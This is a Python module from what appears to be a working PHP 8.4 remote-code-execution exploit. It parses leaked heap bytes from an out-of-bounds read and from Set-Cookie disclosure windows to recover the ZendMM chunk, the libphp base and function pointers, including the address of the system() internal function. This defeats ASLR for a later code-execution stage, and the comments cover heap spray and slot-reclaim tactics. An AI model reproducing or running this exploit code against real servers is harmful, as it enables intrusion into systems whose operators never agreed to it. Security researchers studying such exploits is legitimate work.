#!/usr/bin/env python3
# INDEX: parse disclosure leaks into address families | all | needs per-build offsets table
"""Response/header byte parsers that derive address sets from disclosure leaks.

Given raw response/header bytes plus the per-build offsets table, each derives
the request-heap address families (ZendMM chunk, php/libphp base, function
pointers) from a leaked disclosure window: parse_var_hash_leak reads the sidtail
hexdump; parse_cookie_leak and parse_cookie_rce_leak read the Set-Cookie disclosure
window; cookie_from_headers and classify_cookie extract and triage the Set-Cookie
bytes. Stdlib only (re, struct, urllib.parse, os); python3 -I safe.
"""
import os
import re
import struct
import urllib.parse

LEAK_LEN = 16384             # r2g.php's sidtail hexdump size (bytes)
COOKIE_RCE_MAIN_BUCKET = 87             # stable count of main-chunk pointers in the window


def _carrier_base_locate():
    """Load the self-referential carrier-base-locate helper by path (python3 -I
    safe, no reliance on sys.path); cached."""
    import importlib.util as _ilu
    cache = _carrier_base_locate.__dict__.setdefault("_cache", {})
    if "m" not in cache:
        p = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                         "carrier_base_locate.py")
        spec = _ilu.spec_from_file_location("carrier_base_locate", p)
        mod = _ilu.module_from_spec(spec)
        spec.loader.exec_module(mod)
        cache["m"] = mod
    return cache["m"]


def _rtc_transplant_resolver():
    """Load the transplant resolver module by path (for its index-relative
    cluster extractor); cached."""
    import importlib.util as _ilu
    import sys as _sys
    cache = _rtc_transplant_resolver.__dict__.setdefault("_cache", {})
    if "m" not in cache:
        here = os.path.dirname(os.path.abspath(__file__))
        poc_root = os.path.dirname(os.path.dirname(here))
        for _p in (here, poc_root):
            if _p not in _sys.path:
                _sys.path.insert(0, _p)
        p = os.path.join(here, "rtc_transplant_resolver.py")
        spec = _ilu.spec_from_file_location("rtc_transplant_resolver", p)
        mod = _ilu.module_from_spec(spec)
        spec.loader.exec_module(mod)
        cache["m"] = mod
    return cache["m"]


def parse_var_hash_leak(text, off_):
    """Derive the rce-round address set from a --mode leak response.

    The leak's OOB read (r2g.php's sidtail= hexdump, 16 KiB past the sid)
    contains three stable pointer families of the request heap:
    - the multipart parse-state bucket chain: words at X with word(X+0x40) =
      word(X)+0x40 - self-referential, so they give the 2 MiB ZendMM chunk
      without any ground truth; one node is a static HashTable copy whose
      +0x30 field holds zval_ptr_dtor and +0x10 a rodata pointer, giving the
      php binary base (cross-checked).
    - the run-time-cache slot array: zend_internal_function pointers into the
      [heap] function table; the per-build slot map (off_["anchor_slots"])
      names each member and off_["anchor_deltas"] turns every member into a
      fn_quotemeta vote (majority wins - the slots cross-check each other).
    off_ is the per-build offsets table. Returns dict(a, copy,
    sid, binbase, fn, zsys, chunk); raises ValueError when a family is missing
    (e.g. on the first round of a fresh worker, before the opcache compile
    residue settles - just leak again)."""
    m = re.search(r"sidtail=([0-9a-f]+)", text)
    if not m:
        raise ValueError("no sidtail= in the response (no write -> patched "
                         "target or wrong bootstrap)")
    data = bytes.fromhex(m.group(1))
    if len(data) < LEAK_LEN:
        raise ValueError(f"leak too short ({len(data)} bytes)")

    def w(off):
        return struct.unpack("<Q", data[off:off + 8])[0]

    isptr = lambda v: 0x100000000000 <= v < 0x800000000000

    # 1. chunk: the self-referential +0x40-stride chain words.
    votes = {}
    for off in range(0, len(data) - 0x48, 8):
        if isptr(w(off)) and w(off + 0x40) == w(off) + 0x40:
            votes[w(off) & ~0x1FFFFF] = votes.get(w(off) & ~0x1FFFFF, 0) + 1
    if not votes:
        raise ValueError("no self-referential chain in the leak")
    chunk = max(votes, key=votes.get)

    # 2. binbase: exactly one chain node is a static HashTable copy whose
    # signature is stable across boots (node+0x20 == 0x10, node+0x28 ==
    # 0x8000000000000000); its +0x30 holds zval_ptr_dtor and +0x10 a rodata
    # pointer (the cross-check). Rounds before the opcache compile residue
    # settles carry different node bytes - leak again.
    bb, bbx = [], []
    for off in range(0, len(data) - 0x48, 8):
        if not (isptr(w(off)) and w(off + 0x40) == w(off) + 0x40):
            continue
        if w(off + 0x20) == 0x10 and w(off + 0x28) == 0x8000000000000000:
            if isptr(w(off + 0x30)):
                c = w(off + 0x30) - off_["zval_ptr_dtor"]
                if 0x100000000000 <= c < 0x800000000000 and c % 0x1000 == 0:
                    bb.append(c)
            if isptr(w(off + 0x10)):
                c = w(off + 0x10) - off_.get("rodata_x", 0)
                if 0x100000000000 <= c < 0x800000000000 and c % 0x1000 == 0:
                    bbx.append(c)
    if not bb:
        raise ValueError("no zval_ptr_dtor node in the chain (residue not "
                         "settled yet - run the leak round again)")
    binbase = max(set(bb), key=bb.count)
    if bbx and binbase not in bbx:
        raise ValueError(f"binbase cross-check failed ({binbase:#x} vs {bbx})")

    # 3. the [heap] anchor cluster: pointers that are neither chunk nor
    # binary family, clustered within 0x40000 of each other (the lone
    # request-dependent [heap] pointer and the lib pointers never cluster).
    cluster = _rtc_transplant_resolver().extract_cluster(m.group(1), chunk, binbase)
    if not cluster:
        raise ValueError("no [heap] anchor cluster in the leak")
    # fn_quotemeta via the per-build slot map: every cluster member is a
    # known internal function's zend_function (the run-time-cache slots),
    # and member - delta(member's function) must agree across slots.
    votes = {}
    for i, v in enumerate(cluster):
        name = off_.get("anchor_slots", {}).get(i)
        d = off_.get("anchor_deltas", {}).get(name) if name else None
        if d is not None:
            votes[v - d] = votes.get(v - d, 0) + 1
    if not votes:
        raise ValueError("no anchor slot mapped to a delta (offsets table?)")
    fn = max(votes, key=votes.get)
    span = [min(cluster), max(cluster)]
    if not span[0] - 0x40000 <= fn <= span[1] + 0x40000:
        raise ValueError(f"fn sanity check failed ({fn:#x} vs cluster {span})")

    a = chunk + off_["a_off"]
    return {"a": a, "copy": a + off_["copy_off"], "sid": a + off_["sid_off"],
            "binbase": binbase, "fn": fn, "zsys": binbase + off_["zif_system"],
            "chunk": chunk}


def cookie_from_headers(hdr_bytes):
    """Extract+urldecode the PHPSESSID Set-Cookie value (PHP's
    php_url_encode maps ' ' to '+', everything else to %HH)."""
    for line in hdr_bytes.decode("utf-8", "replace").splitlines():
        if line.lower().startswith("set-cookie:"):
            val = line.split(":", 1)[1].strip()
            if val.startswith("PHPSESSID="):
                v = val[len("PHPSESSID="):].split(";", 1)[0]
                return urllib.parse.unquote_to_bytes(v.replace("+", " "))
    return None


def classify_cookie(cookie):
    """clean: a fresh random sid (256 [a-z0-9] chars - either R2 created it
    (R1's OOM before the sid alloc) or the spray missed the freed slot and
    the dead sid survived intact). hit: our planted window (the 'SSSS\\0'
    prefix)."""
    if cookie is None:
        return "none", None
    if cookie.startswith(b"SSSS\x00"):
        return "hit", cookie
    if len(cookie) in range(200, 300) and \
            all(chr(c) in "abcdefghijklmnopqrstuvwxyz0123456789" for c in cookie):
        return "clean", cookie
    return "other", cookie


def parse_cookie_leak(data, off_):
    """Derive {chunk, binbase} from the cookie disclosure window (the same
    families parse_var_hash_leak reads in sidtail): the self-referential
    0x40-stride chain words give the 2 MiB ZendMM chunk, and the static
    HashTable-copy node (+0x20==0x10, +0x28==0x8000000000000000) whose +0x30
    holds zval_ptr_dtor gives the php binary base. Raises ValueError when a
    family is missing."""
    if len(data) < 0x48:
        raise ValueError(f"window too short ({len(data)} bytes)")

    def w(off):
        return struct.unpack("<Q", data[off:off + 8])[0]

    isptr = lambda v: 0x100000000000 <= v < 0x800000000000

    votes = {}
    for off in range(0, len(data) - 0x48, 8):
        if isptr(w(off)) and w(off + 0x40) == w(off) + 0x40:
            votes[w(off) & ~0x1FFFFF] = votes.get(w(off) & ~0x1FFFFF, 0) + 1
    if not votes:
        # The delivered cookie window sits at the TOP of its 2 MiB chunk:
        # the sid is created last (END cleanup), so the 0x40-stride self-ref
        # chain is BEHIND the reclaimed slot, unreachable by php_url_encode's
        # strictly-forward read. But the freed b320 spray slots forward of the
        # slot thread a 0x140-stride ZendMM free list whose next-pointers are
        # all chunk-interior, so the majority of (ptr & ~0x1FFFFF) over every
        # heap pointer in the window still yields the chunk base (no binbase
        # family is ever reachable forward).
        for off in range(0, len(data) - 8, 8):
            if isptr(w(off)):
                votes[w(off) & ~0x1FFFFF] = votes.get(w(off) & ~0x1FFFFF, 0) + 1
        if not votes:
            raise ValueError("no chunk pointers in the window")
    chunk = max(votes, key=votes.get)

    bb, bbx = [], []
    for off in range(0, len(data) - 0x48, 8):
        if not (isptr(w(off)) and w(off + 0x40) == w(off) + 0x40):
            continue
        if w(off + 0x20) == 0x10 and w(off + 0x28) == 0x8000000000000000:
            if isptr(w(off + 0x30)):
                c = w(off + 0x30) - off_["zval_ptr_dtor"]
                if 0x100000000000 <= c < 0x800000000000 and c % 0x1000 == 0:
                    bb.append(c)
            if isptr(w(off + 0x10)):
                c = w(off + 0x10) - off_.get("rodata_x", 0)
                if 0x100000000000 <= c < 0x800000000000 and c % 0x1000 == 0:
                    bbx.append(c)
    # binbase is best-effort. The static-HashTable node that carries
    # zval_ptr_dtor is compile residue of a prior leak script (nTableSize==0x10);
    # the trivial endpoint heap never holds it and it is never reachable forward
    # of the sid anyway, so the window banks the CHUNK alone and the caller
    # re-derives binbase from its own leak (chunk-only ignition).
    binbase = None
    if bb:
        binbase = max(set(bb), key=bb.count)
        if bbx and binbase not in bbx:
            binbase = None
    return {"chunk": chunk, "binbase": binbase}


def parse_cookie_rce_leak(resp, off, determ=False):
    """Derive {lib, main_candidates, ...} from the disclose_read Set-Cookie window:
    zval_ptr_dtor is the repeated heap pointer whose page offset
    matches off["zval_ptr_dtor"] (-> libphp via that offset); the main chunk is
    the 2 MiB-aligned pointer bucket whose count best matches the 87-pointer
    fingerprint, excluding the libphp bucket and the dominant id-chunk bucket.

    3em0 alignment fix: libphp is NOT 2 MiB-aligned on the official
    php:8.4.26-apache image (it maps on a 4 KiB boundary, e.g. 0x...acdb000),
    so the plain most-common qword can be some other repeated heap value rather
    than &zval_ptr_dtor. We instead pin the real dtor by its page offset -- a
    genuine &zval_ptr_dtor shares its low 12 bits with off["zval_ptr_dtor"] (the
    symbol's offset inside the r-x page) -- and validate the derived base as
    page-aligned rather than 2 MiB-aligned. That rejects a leak whose top qword
    is some unrelated repeat, turning a silent wrong-base failure into a clean
    retry."""
    i = resp.find(b"Set-Cookie: PHPSESSID=")
    if i < 0:
        raise ValueError(f"no Set-Cookie in leak response ({len(resp)} bytes)")
    val = resp[i + len(b"Set-Cookie: PHPSESSID="):].split(b"\r\n")[0]
    dec = urllib.parse.unquote_to_bytes(val.decode("latin1"))
    counts = {}
    for o in range(0, len(dec) - 8, 8):
        q = struct.unpack_from("<Q", dec, o)[0]
        # Lower bound 0x70.. matches parse_cookie_leak: the mmap base can ASLR
        # below 0x7F0000000000 (observed a 0x7dbe.. roll), so a 0x7F.. floor
        # would drop those legit heap pointers and lose the leak. The
        # dtor-page-offset pin + page-aligned base validation below still reject
        # non-pointer repeats in this range.
        if 0x700000000000 <= q <= 0x7FFFFFFFFFFF:
            counts[q] = counts.get(q, 0) + 1
    if not counts:
        raise ValueError("no heap pointers in the leak window")
    # Prefer the repeated pointer whose low 12 bits match the dtor's page
    # offset; among those, take the most common. Fall back to the plain
    # most-common qword only when none match, so this is never worse than a
    # blind most-common pick.
    page = off["zval_ptr_dtor"] & 0xFFF
    aligned = {q: c for q, c in counts.items() if q & 0xFFF == page}
    zdtor = max(aligned, key=aligned.get) if aligned else max(counts, key=counts.get)
    lib = zdtor - off["zval_ptr_dtor"]
    # Validate the base by the same page relation (libphp maps page-aligned):
    # a mismatch means the fallback landed on a non-dtor repeat, so bail to a
    # clean retry instead of chasing a wrong base. (Guaranteed to hold whenever
    # the page-offset match above succeeded.)
    if lib & 0xFFF != 0:
        raise ValueError(f"derived libphp base {lib:#x} not page-aligned "
                         f"(no dtor-page match in leak window)")
    buckets = {}
    for q, c in counts.items():
        buckets[q & ~0x1FFFFF] = buckets.get(q & ~0x1FFFFF, 0) + c
    lib_bucket = zdtor & ~0x1FFFFF
    id_bucket = max(buckets, key=buckets.get)
    cands = sorted(((bb, c) for bb, c in buckets.items()
                    if bb not in (lib_bucket, id_bucket)),
                   key=lambda bc: (abs(bc[1] - COOKIE_RCE_MAIN_BUCKET), bc[1]))
    main_candidates = [bb for bb, _ in cands[:3]]
    # Step 3 (--deterministic): recover the carrier base from the leak window's
    # self-referential pointers instead of trusting the hardcoded chunk-rel
    # htdata_off (0x690d8). self_locate returns the PAGE-aligned carrier base
    # (== chunk + a_off); its 2 MiB chunk base is an INDEPENDENT main-chunk
    # candidate. We prepend it (tried first) but never drop the bucket-derived
    # candidates, so a sub-quorum / mismatched recovery falls straight back to
    # the bucket-derived candidates - this can only add a candidate, never lose
    # a shot.
    sl = None
    if determ:
        _sl = _carrier_base_locate()
        base, votes = _sl.self_locate(dec)
        sl = {"base": base, "votes": votes}
        if base is not None:
            ch = _sl.chunk_base(base)
            sl["chunk"] = ch
            sl["carrier_off"] = base - ch         # expect a_off (0x69000)
            if ch not in main_candidates:
                main_candidates = [ch] + main_candidates
    return {"decoded": len(dec), "zdtor": zdtor, "lib": lib, "buckets": buckets,
            "main_candidates": main_candidates,
            "cand_counts": {bb: c for bb, c in cands[:3]},
            "dtor_aligned": bool(aligned), "self_locate": sl}
